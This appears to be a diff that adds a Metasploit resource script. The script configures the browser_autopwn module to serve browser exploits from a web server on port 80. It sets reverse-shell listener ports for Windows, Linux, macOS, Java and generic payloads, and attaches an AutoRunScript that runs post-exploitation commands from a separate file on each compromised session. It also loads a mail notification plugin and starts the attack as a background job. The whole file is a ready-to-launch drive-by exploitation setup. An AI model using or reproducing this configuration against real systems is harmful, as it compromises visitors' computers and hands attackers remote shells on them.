@@ -1,0 +1,15 @@
+load notify_mail
+notify_mail_load
+
+use auxiliary/server/browser_autopwn
+set LHOST 192.168.0.10
+set SRVPORT 80
+set URIPATH /
+set LPORT_GENERIC 3334
+set LPORT_JAVA 3335
+set LPORT_LINUX 3332
+set LPORT_MACOS 3333
+set LPORT_WIN32 3331
+set AutoRunScript multi_console_command -rc ../autoruncommands.rc
+
+exploit -j -z
